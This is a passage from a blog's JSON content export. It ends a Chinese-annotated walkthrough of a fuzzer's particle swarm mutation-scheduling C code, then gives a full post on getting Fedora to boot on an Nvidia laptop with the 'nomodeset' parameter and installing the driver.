last_limit_time_start = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 还原并更新一些变量</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (unlikely(tmp_pilot_time &gt; period_pilot))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        total_pacemaker_time += tmp_pilot_time;</span><br><span class=\"line\">        new_hit_cnt = queued_paths + unique_crashes;</span><br><span class=\"line\">        swarm_fitness[swarm_now] = (<span class=\"type\">double</span>)(total_puppet_find - temp_puppet_find) / ((<span class=\"type\">double</span>)(tmp_pilot_time)/ period_pilot_tmp);</span><br><span class=\"line\">        tmp_pilot_time = <span class=\"number\">0</span>;</span><br><span class=\"line\">        temp_puppet_find = total_puppet_find;</span><br><span class=\"line\"></span><br><span class=\"line\">        u64 temp_stage_finds_puppet = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                <span class=\"type\">double</span> temp_eff = <span class=\"number\">0.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (stage_cycles_puppet_v2[swarm_now][i] &gt; stage_cycles_puppet[swarm_now][i])</span><br><span class=\"line\">                        temp_eff = (<span class=\"type\">double</span>)(stage_finds_puppet_v2[swarm_now][i] - stage_finds_puppet[swarm_now][i]) /</span><br><span class=\"line\">                        (<span class=\"type\">double</span>)(stage_cycles_puppet_v2[swarm_now][i] - stage_cycles_puppet[swarm_now][i]);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (eff_best[swarm_now][i] &lt; temp_eff)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        eff_best[swarm_now][i] = temp_eff;</span><br><span class=\"line\">                        L_best[swarm_now][i] = x_now[swarm_now][i];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            \t<span class=\"comment\">// 找到particle对应的历史最优概率分布</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">// 更新L_best</span></span><br><span class=\"line\">                stage_finds_puppet[swarm_now][i] = stage_finds_puppet_v2[swarm_now][i];</span><br><span class=\"line\">                stage_cycles_puppet[swarm_now][i] = stage_cycles_puppet_v2[swarm_now][i];</span><br><span class=\"line\">                temp_stage_finds_puppet += stage_finds_puppet[swarm_now][i];</span><br><span class=\"line\">            \t<span class=\"comment\">// 更新一些和计算 生成的好的test case数量 相关的变量</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        swarm_now = swarm_now + <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (swarm_now == swarm_num)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                key_module = <span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        core_operator_cycles_puppet_v2[i] = core_operator_cycles_puppet[i];</span><br><span class=\"line\">                        core_operator_cycles_puppet_v3[i] = core_operator_cycles_puppet[i];</span><br><span class=\"line\">                        core_operator_finds_puppet_v2[i] = core_operator_finds_puppet[i];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">// 更新一些和计算 生成的好的test case数量 相关的变量</span></span><br><span class=\"line\">                <span class=\"type\">double</span> swarm_eff = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">                swarm_now = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; swarm_num; i++)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (swarm_fitness[i] &gt; swarm_eff)</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                                swarm_eff = swarm_fitness[i];</span><br><span class=\"line\">                                swarm_now = i;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            \t<span class=\"comment\">// 选择最好的swarm</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (swarm_now &lt;<span class=\"number\">0</span> || swarm_now &gt; swarm_num - <span class=\"number\">1</span>)</span><br><span class=\"line\">                        PFATAL(<span class=\"string\">&quot;swarm_now error number  %d&quot;</span>, swarm_now);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"0x2-4-pso-updating\">0x2.4.pso_updating()</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">pso_updating</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tg_now += <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (g_now &gt; g_max) g_now = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tw_now = (w_init - w_end)*(g_max - g_now) / (g_max)+w_end; </span><br><span class=\"line\">\t<span class=\"type\">int</span> tmp_swarm, i, j;</span><br><span class=\"line\">\tu64 temp_operator_finds_puppet = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\toperator_finds_puppet[i] = core_operator_finds_puppet[i];</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; swarm_num; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\toperator_finds_puppet[i] = operator_finds_puppet[i] + stage_finds_puppet[j][i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\ttemp_operator_finds_puppet = temp_operator_finds_puppet + operator_finds_puppet[i];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// 计算变异产生的好test cese的个数</span></span><br><span class=\"line\">    <span class=\"comment\">// 为更新G_best()做准备</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (operator_finds_puppet[i])</span><br><span class=\"line\">\t\t\tG_best[i] = (<span class=\"type\">double</span>)((<span class=\"type\">double</span>)(operator_finds_puppet[i]) / (<span class=\"type\">double</span>)(temp_operator_finds_puppet)); </span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    <span class=\"comment\">// 更新G_best()，即PSO中的全局最优分布</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (tmp_swarm = <span class=\"number\">0</span>; tmp_swarm &lt; swarm_num; tmp_swarm++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">double</span> x_temp = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tprobability_now[tmp_swarm][i] = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">\t\t\tv_now[tmp_swarm][i] = w_now * v_now[tmp_swarm][i] + RAND_C * (L_best[tmp_swarm][i] - x_now[tmp_swarm][i]) + RAND_C * (G_best[i] - x_now[tmp_swarm][i]);</span><br><span class=\"line\">\t\t\tx_now[tmp_swarm][i] += v_now[tmp_swarm][i];</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (x_now[tmp_swarm][i] &gt; v_max)</span><br><span class=\"line\">\t\t\t\tx_now[tmp_swarm][i] = v_max;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x_now[tmp_swarm][i] &lt; v_min)</span><br><span class=\"line\">\t\t\t\tx_now[tmp_swarm][i] = v_min;</span><br><span class=\"line\">\t\t\tx_temp += x_now[tmp_swarm][i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"comment\">// 根据pso算法更新v_now数组和x_now数组</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tx_now[tmp_swarm][i] = x_now[tmp_swarm][i] / x_temp;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (likely(i != <span class=\"number\">0</span>))</span><br><span class=\"line\">\t\t\t\tprobability_now[tmp_swarm][i] = probability_now[tmp_swarm][i - <span class=\"number\">1</span>] + x_now[tmp_swarm][i];</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t\tprobability_now[tmp_swarm][i] = x_now[tmp_swarm][i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">        <span class=\"comment\">// 设置probablility_now为前缀和数组</span></span><br><span class=\"line\">        <span class=\"comment\">// 供select_algorithm使用</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (probability_now[tmp_swarm][operator_num - <span class=\"number\">1</span>] &lt; <span class=\"number\">0.99</span> || probability_now[tmp_swarm][operator_num - <span class=\"number\">1</span>] &gt; <span class=\"number\">1.01</span>) FATAL(<span class=\"string\">&quot;ERROR probability&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tswarm_now = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tkey_module = <span class=\"number\">0</span>; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"Fedora-and-Nvidia-driver-installing","date":"2022-10-14T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n## 背景\n\n最近一直在折腾自己的windows的配置，包括外观还有各种环境的配置，感觉自己做的颇为臃肿了，所以打算配一个Fedora的双系统，从头开始规划，配置作为自己的主力办公系统。\n\n就我个人而言，我在之前有过一段时间的Ubuntu的虚拟机的使用，对于Red Hat系的linux发行版没有什么使用经验，同时，对于双系统，引导启动没有过多的概念，此为前提。\n\n## 问题的出现\n\n在初步了解了一些双系统的知识后，我开始了自己的Fedora安装之旅。\n\n- 首先在windows下创建一个空闲的硬盘分区\n- 利用Fedora提供的官方工具Fedora Media Writer制作了一个Fedora的启动U盘\n- 开机时进入BIOS，选择从引导盘启动\n\n一切都很顺利，然而在我在Grub中选择Start Fedora时，在一段时间运行后，还没有进入安装时，Fedora就直接终止了，黑屏一段时间后，就直接返回了Grub界面，这让我有些懵了。\n\n## 问题的定位\n\n在问题出现后，第一反应，肯定是直接搜索看有没有跟我相同的问题出现，于是我分别在Google 和ask Fedora论坛上同时搜索了这个问题，但是没有找到相关结果，难道要在ask fedora上提问吗？这个得到回答的周期对我来说可能太长了，我还是尽可能想自己尽快找出结果。\n\n那么思路就很清晰了，首先排除偶然因素：\n\n于是我重新制作了一个启动盘，在此尝试了一下，然而还是闪退，既然问题是稳定出现的，我开始真正定位问题：\n\n考虑在这个安装环节中，我都是同大多人一样的步骤，那么我开始回顾在这个安装过程中有哪些环节可以出问题：\n\n- iso文件\n- linux发行版特性\n- U盘\n\n于是我开始尝试更换发行版，包括Fedora37和ubuntu22，然而还是稳定出现了闪退问题。那iso文件问题或者linux发行版问题可以排除了。\n\n接下来再换了一个U盘，然而还是闪退。\n\n到这里，似乎已经进入死胡同了，难道是电脑的问题？我不可能为此换一个电脑啊，似乎这不是我能解决的问题了，因为我对引导启动过程只是一知半解，想debug也无从下手。\n\n这个时候我看着Grub的界面，开始了思考和尝试:\n\n> --------------------------------------------Grub--------------------------------------------------\n>\n> *start Fedora\n>\n> test this media & start Fedora\n>\n> troubleshouting----->\n\n在第一个和第二个选项都已经尝试过后，我自然的进入第三个选项troubleshouting上了，出乎意料的，在troubleshouting后，我发现我进入了Fedora的安装界面，虽然分辨率堪忧，但是有了进展和区别，总是好的。\n\n于是我重新回到Grub界面，按e键分别查看前三个选项的启动命令行，分析差别。\n\n一个显而易见的差别映入我的眼帘，“nomodeset”参数，这个参数在troubleshouting中有，然而在前两个选项中没有，这会是troubleshouting能成功启动的原因吗？\n\n于是我在e键跟进了第一个选项，添加了nomedeset参数，ctrl+x键执行，成功进入安装界面，虽然依旧是分辨率堪忧。\n\n于是再次Google nomedeset的作用，发现是暂且不加载显卡模块。看见显卡二字，以及自己电脑上绿色的Nvidia商标，再联想到linus著名的f**k nvidia之喷，我大概确定了了，是显卡的问题。\n\n\n\n\n\n## 解决问题\n\n既然确定了是显卡的问题，那么转换搜索思路，以Nvidia为关键词再在ask fedora搜索，于是找到了[这个](https://ask.fedoraproject.org/t/kde-fails-to-boot-on-certain-nvidia-graphics-cards-in-uefi-mode/22065)\n\n>## Problem\n>\n>On systems with certain Nvidia graphics cards, Fedora 36 KDE fails to boot in UEFI mode. This includes both the Live installer image and the installed system.\n>\n>It only happens in combination with Wayland display protocol, but the KDE login screen it configured to use Wayland by default, so this happens every time, unless the settings are changed in the installed system.\n>\n>## Cause\n>\n>Not yet known. In general, Nvidia’s attitude towards Linux.\n>\n>## Related Issues\n>\n>Bugzilla report: [2077359 – KDE on X11 with native graphics hangs with Nvidia GPU and UEFI 53](https://bugzilla.redhat.com/show_bug.cgi?id=2077359)\n>\n>## Workarounds\n>\n>You have the following options:\n>A) Switch your system to BIOS mode instead of UEFI and install Fedora that way.\n>B) Boot the install in *Safe graphics mode* (available under the *Troubleshooting* boot menu). After system install, either install the closed-source nvidia driver (if you intended to do so), or set KDE to always use X11 instead of Wayland, including the login screen. Then edit the grub config files to remove the *nomodeset* keyword (triggering safe graphics mode) and rebuild the installed grub bootloader config.\n>C) Install Fedora Workstation (GNOME) instead of KDE.\n>D) Switch your graphics card to a more Linux-friendly vendor (AMD, Intel). You might already have an integrated graphics card in your CPU which you can use instead of the Nvidia external one.\n\n那么基本确定了解决思路：\n\nnomodeset先install fedora，然后进入fedora安装Nvidia显卡驱动，然后再重新启动。\n\n当然，在安装驱动过程中也遇到了一些问题，网络上对于驱动安装基本有三种主流的方法：\n\n- 在dnf添加两个源，用dnf安装\n- 用Nvidia官方的脚本安装\n- 在dnf添加一个module，用dnf安装(由于我是第一次使用red hat系的发行版，对dnf不是很熟，不是很能理解和第一个的区别)\n\n\n\n尝试了一下后，发现第一第二种都出现了一些莫名其妙的问题，最后在第三种方法下完美完成。\n\n## 一些感想\n\n//突然没灵感，待写","source":"_posts/Fedora-and-Nvidia-driver-installing.md","raw":"---\ntitle: Fedora-and-Nvidia-driver-installing\ndate: 2022-10-15\ntags: \n- Linux\n\ncategories:\n- Linux\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n## 背景\n\n最近一直在折腾自己的windows的配置，包括外观还有各种环境的配置，感觉自己做的颇为臃肿了，所以打算配一个Fedora的双系统，从头开始规划，配置作为自己的主力办公系统。\n\n就我个人而言，我在之前有过一段时间的Ubuntu的虚拟机的使用，对于Red Hat系的linux发行版没有什么使用经验，同时，对于双系统，引导启动没有过多的概念，此为前提。\n\n## 问题的出现\n\n在初步了解了一些双系统的知识后，我开始了自己的Fedora安装之旅。\n\n- 首先在windows下创建一个空闲的硬盘分区\n- 利用Fedora提供的官方工具Fedora Media Writer制作了一个Fedora的启动U盘\n- 开机时进入BIOS，选择从引导盘启动\n\n一切都很顺利，然而在我在Grub中选择Start Fedora时，在一段时间运行后，还没有进入安装时，Fedora就直接终止了，黑屏一段时间后，就直接返回了Grub界面，这让我有些懵了。\n\n## 问题的定位\n\n在问题出现后，第一反应，肯定是直接搜索看有没有跟我相同的问题出现，于是我分别在Google 和ask Fedora论坛上同时搜索了这个问题，但是没有找到相关结果，难道要在ask fedora上提问吗？这个得到回答的周期对我来说可能太长了，我还是尽可能想自己尽快找出结果。\n\n那么思路就很清晰了，首先排除偶然因素：\n\n于是我重新制作了一个启动盘，在此尝试了一下，然而还是闪退，既然问题是稳定出现的，我开始真正定位问题：\n\n考虑在这个安装环节中，我都是同大多人一样的步骤，那么我开始回顾在这个安装过程中有哪些环节可以出问题：\n\n- iso文件\n- linux发行版特性\n- U盘\n\n于是我开始尝试更换发行版，包括Fedora37和ubuntu22，然而还是稳定出现了闪退问题。那iso文件问题或者linux发行版问题可以排除了。\n\n接下来再换了一个U盘，然而还是闪退。\n\n到这里，似乎已经进入死胡同了，难道是电脑的问题？我不可能为此换一个电脑啊，似乎这不是我能解决的问题了，因为我对引导启动过程只是一知半解，想debug也无从下手。\n\n这个时候我看着Grub的界面，开始了思考和尝试:\n\n> --------------------------------------------Grub--------------------------------------------------\n>\n> *start Fedora\n>\n> test this media & start Fedora\n>\n> troubleshouting----->\n\n在第一个和第二个选项都已经尝试过后，我自然的进入第三个选项troubleshouting上了，出乎意料的，在troubleshouting后，我发现我进入了Fedora的安装界面，虽然分辨率堪忧，但是有了进展和区别，总是好的。\n\n于是我重新回到Grub界面，按e键分别查看前三个选项的启动命令行，分析差别。\n\n一个显而易见的差别映入我的眼帘，“nomodeset”参数，这个参数在troubleshouting中有，然而在前两个选项中没有，这会是troubleshouting能成功启动的原因吗？\n\n于是我在e键跟进了第一个选项，添加了nomedeset参数，ctrl+x键执行，成功进入安装界面，虽然依旧是分辨率堪忧。\n\n于是再次Google nomedeset的作用，发现是暂且不加载显卡模块。看见显卡二字，以及自己电脑上绿色的Nvidia商标，再联想到linus著名的f**k nvidia之喷，我大概确定了了，是显卡的问题。\n\n\n\n\n\n## 解决问题\n\n既然确定了是显卡的问题，那么转换搜索思路，以Nvidia为关键词再在ask fedora搜索，于是找到了[这个](https://ask.fedoraproject.org/t/kde-fails-to-boot-on-certain-nvidia-graphics-cards-in-uefi-mode/22065)\n\n>## Problem\n>\n>On systems with certain Nvidia graphics cards, Fedora 36 KDE fails to boot in UEFI mode. This includes both the Live installer image and the installed system.\n>\n>It only happens in combination with Wayland display protocol, but the KDE login screen it configured to use Wayland by default, so this happens every time, unless the settings are changed in the installed system.\n>\n>## Cause\n>\n>Not yet known. In general, Nvidia’s attitude towards Linux.\n>\n>## Related Issues\n>\n>Bugzilla report: [2077359 – KDE on X11 with native graphics hangs with Nvidia GPU and UEFI 53](https://bugzilla.redhat.com/show_bug.cgi?id=2077359)\n>\n>## Workarounds\n>\n>You have the following options:\n>A) Switch your system to BIOS mode instead of UEFI and install Fedora that way.\n>B) Boot the install in *Safe graphics mode* (available under the *Troubleshooting* boot menu). After system install, either install the closed-source nvidia driver (if you intended to do so), or set KDE to always use X11 instead of Wayland, including the login screen. Then edit the grub config files to remove the *nomodeset* keyword (triggering safe graphics mode) and rebuild the installed grub bootloader config.\n>C) Install Fedora Workstation (GNOME) instead of KDE.\n>D) Switch your graphics card to a more Linux-friendly vendor (AMD, Intel). You might already have an integrated graphics card in your CPU which you can use instead of the Nvidia external one.\n\n那么基本确定了解决思路：\n\nnomodeset先install fedora，然后进入fedora安装Nvidia显卡驱动，然后再重新启动。\n\n当然，在安装驱动过程中也遇到了一些问题，网络上对于驱动安装基本有三种主流的方法：\n\n- 在dnf添加两个源，用dnf安装\n- 用Nvidia官方的脚本安装\n- 在dnf添加一个module，用dnf安装(由于我是第一次使用red hat系的发行版，对dnf不是很熟，不是很能理解和第一个的区别)\n\n\n\n尝试了一下后，发现第一第二种都出现了一些莫名其妙的问题，最后在第三种方法下完美完成。\n\n## 一些感想\n\n//突然没灵感，待写","slug":"Fedora-and-Nvidia-driver-installing","published":1,"updated":"2022-10-15T00:24:46.367Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl996gnps00001wv07mywatz3","content":"<h2 id=\"背景\">背景</h2>\n<p>最近一直在折腾自己的windows的配置，包括外观还有各种环境的配置，感觉自己做的颇为臃肿了，所以打算配一个Fedora的双系统，从头开始规划，配置作为自己的主力办公系统。</p>\n<p>就我个人而言，我在之前有过一段时间的Ubuntu的虚拟机的使用，对于Red Hat系的linux发行版没有什么使用经验，同时，对于双系统，引导启动没有过多的概念，此为前提。</p>\n<h2 id=\"问题的出现\">问题的出现</h2>\n<p>在初步了解了一些双系统的知识后，我开始了自己的Fedora安装之旅。</p>\n<ul>\n<li>首先在windows下创建一个空闲的硬盘分区</li>\n<li>利用Fedora提供的官方工具Fedora Media Writer制作了一个Fedora的启动U盘</li>\n<li>开机时进入BIOS，选择从引导盘启动</li>\n</ul>\n<p>一切都很顺利，然而在我在Grub中选择Start Fedora时，在一段时间运行后，还没有进入安装时，Fedora就直接终止了，黑屏一段时间后，就直接返回了Grub界面，这让我有些懵了。</p>\n<h2 id=\"问题的定位\">问题的定位</h2>\n<p>在问题出现后，第一反应，肯定是直接搜索看有没有跟我相同的问题出现，于是我分别在Google 和ask Fedora论坛上同时搜索了这个问题，但是没有找到相关结果，难道要在ask fedora上提问吗？这个得到回答的周期对我来说可能太长了，我还是尽可能想自己尽快找出结果。</p>\n<p>那么思路就很清晰了，首先排除偶然因素：</p>\n<p>于是我重新制作了一个启动盘，在此尝试了一下，然而还是闪退，既然问题是稳定出现的，我开始真正定位问题：</p>\n<p>考虑在这个安装环节中，我都是同大多人一样的步骤，那么我开始回顾在这个安装过程中有哪些环节可以出问题：</p>\n<ul>\n<li>iso文件</li>\n<li>linux发行版特性</li>\n<li>U盘</li>\n</ul>\n<p>于是我开始尝试更换发行版，包括Fedora37和ubuntu22，然而还是稳定出现了闪退问题。那iso文件问题或者linux发行版问题可以排除了。</p>\n<p>接下来再换了一个U盘，然而还是闪退。</p>\n<p>到这里，似乎已经进入死胡同了，难道是电脑的问题？我不可能为此换一个电脑啊，似乎这不是我能解决的问题了，因为我对引导启动过程只是一知半解，想debug也无从下手。</p>\n<p>这个时候我看着Grub的界面，开始了思考和尝试:</p>\n<blockquote>\n<p>--------------------------------------------Grub--------------------------------------------------</p>\n<p>*start Fedora</p>\n<p>test this media &amp; start Fedora</p>\n<p>troubleshouting-----&gt;</p>\n</blockquote>\n<p>在第一个和第二个选项都已经尝试过后，我自然的进入第三个选项troubleshouting上了，出乎意料的，在troubleshouting后，我发现我进入了Fedora的安装界面，虽然分辨率堪忧，但是有了进展和区别，总是好的。</p>\n<p>于是我重新回到Grub界面，按e键分别查看前三个选项的启动命令行，分析差别。</p>\n<p>一个显而易见的差别映入我的眼帘，“nomodeset”参数，这个参数在troubleshouting中有，然而在前两个选项中没有，这会是troubleshouting能成功启动的原因吗？</p>\n<p>于是我在e键跟进了第一个选项，添加了nomedeset参数，ctrl+x键执行，成功进入安装界面，虽然依旧是分辨率堪忧。</p>\n<p>于是再次Google nomedeset的作用，发现是暂且不加载显卡模块。看见显卡二字，以及自己电脑上绿色的Nvidia商标，再联想到linus著名的f**k nvidia之喷，我大概确定了了，是显卡的问题。</p>\n<h2 id=\"解决问题\">解决问题</h2>\n<p>既然确定了是显卡的问题，那么转换搜索思路，以Nvidia为关键词再在ask fedora搜索，于是找到了<a href=\"https://ask.fedoraproject.org/t/kde-fails-to-boot-on-certain-nvidia-graphics-cards-in-uefi-mode/22065\">这个</a></p>\n<blockquote>\n<h2 id=\"Problem\">Problem</h2>\n<p>On systems with certain Nvidia graphics cards, Fedora 36 KDE fails to boot in UEFI mode. This includes both the Live installer image and the installed system.</p>\n<p>It only happens in combination with Wayland display protocol, but the KDE login screen it configured to use Wayland by default, so this happens every time, unless the settings are changed in the installed system.</p>\n<h2 id=\"Cause\">Cause</h2>\n<p>Not yet known. In general, Nvidia’s attitude towards Linux.</p>\n<h2 id=\"Related-Issues\">Related Issues</h2>\n<p>Bugzilla report: <a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2077359\">2077359 – KDE on X11 with native graphics hangs with Nvidia GPU and UEFI 53</a></p>\n<h2 id=\"Workarounds\">Workarounds</h2>\n<p>You have the following options:<br>\nA) Switch your system to BIOS mode instead of UEFI and install Fedora that way.<br>\nB) Boot the install in <em>Safe graphics mode</em> (available under the <em>Troubleshooting</em> boot menu). After system install, either install the closed-source nvidia driver (if you intended to do so), or set KDE to always use X11 instead of Wayland, including the login screen. Then edit the grub config files to remove the <em>nomodeset</em> keyword (triggering safe graphics mode) and rebuild the installed grub bootloader config.<br>\nC) Install Fedora Workstation (GNOME) instead of KDE.<br>\nD) Switch your graphics card to a more Linux-friendly vendor (AMD, Intel). You might already have an integrated graphics card in your CPU which you can use instead of the Nvidia external one.</p>\n</blockquote>\n<p>那么基本确定了解决思路：</p>\n<p>nomodeset先install fedora，然后进入fedora安装Nvidia显卡驱动，然后再重新启动。</p>\n<p>当然，在安装驱动过程中也遇到了一些问题，网络上对于驱动安装基本有三种主流的方法：</p>\n<ul>\n<li>在dnf添加两个源，用dnf安装</li>\n<li>用Nvidia官方的脚本安装</li>\n<li>在dnf添加一个module，用dnf安装(由于我是第一次使用red hat系的发行版，对dnf不是很熟，不是很能理解和第一个的区别)</li>\n</ul>\n<p>尝试了一下后，发现第一第二种都出现了一些莫名其妙的问题，最后在第三种方法下完美完成。</p>\n<h2 id=\"一些感想\">一些感想</h2>\n<p>//突然没灵感，待写</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"背景\">背景</h2>\n<p>最近一直在折腾自己的windows的配置，包括外观还有各种环境的配置，感觉自己做的颇为臃肿了，所以打算配一个Fedora的双系统，从头开始规划，配置作为自己的主力办公系统。</p>\n<p>就我个人而言，我在之前有过一段时间的Ubuntu的虚拟机的使用，对于Red Hat系的linux发行版没有什么使用经验，同时，对于双系统，引导启动没有过多的概念，此为前提。</p>\n<h2 id=\"问题的出现\">问题的出现</h2>\n<p>在初步了解了一些双系统的知识后，我开始了自己的Fedora安装之旅。</p>\n<ul>\n<li>首先在windows下创建一个空闲的硬盘分区</li>\n<li>利用Fedora提供的官方工具Fedora Media Writer制作了一个Fedora的启动U盘</li>\n<li>开机时进入BIOS，选择从引导盘启动</li>\n</ul>\n<p>一切都很顺利，然而在我在Grub中选择Start Fedora时，在一段时间运行后，还没有进入安装时，Fedora就直接终止了，黑屏一段时间后，就直接返回了Grub界面，这让我有些懵了。</p>\n<h2 id=\"问题的定位\">问题的定位</h2>\n<p>在问题出现后，第一反应，肯定是直接搜索看有没有跟我相同的问题出现，于是我分别在Google 和ask Fedora论坛上同时搜索了这个问题，但是没有找到相关结果，难道要在ask fedora上提问吗？这个得到回答的周期对我来说可能太长了，我还是尽可能想自己尽快找出结果。</p>\n<p>那么思路就很清晰了，首先排除偶然因素：</p>\n<p>于是我重新制作了一个启动盘，在此尝试了一下，然而还是闪退，既然问题是稳定出现的，我开始真正定位问题：</p>\n<p>考虑在这个安装环节中，我都是同大多人一样的步骤，那么我开始回顾在这个安装过程中有哪些环节可以出问题：</p>\n<ul>\n<li>iso文件</li>\n<li>linux发行版特性</li>\n<li>U盘</li>\n</ul>\n<p>于是我开始尝试更换发行版，包括Fedora37和ubuntu22，然而还是稳定出现了闪退问题。那iso文件问题或者linux发行版问题可以排除了。</p>\n<p>接下来再换了一个U盘，然而还是闪退。</p>\n<p>到这里，似乎已经进入死胡同了，难道是电脑的问题？我不可能为此换一个电脑啊，似乎这不是我能解决的问题了，因为我对引导启动过程只是一知半解，想debug也无从下手。</p>\n<p>这个时候我看着Grub的界面，开始了思考和尝试:</p>\n<blockquote>\n<p>--------------------------------------------Grub--------------------------------------------------</p>\n<p>*start Fedora</p>\n<p>test this media &amp; start 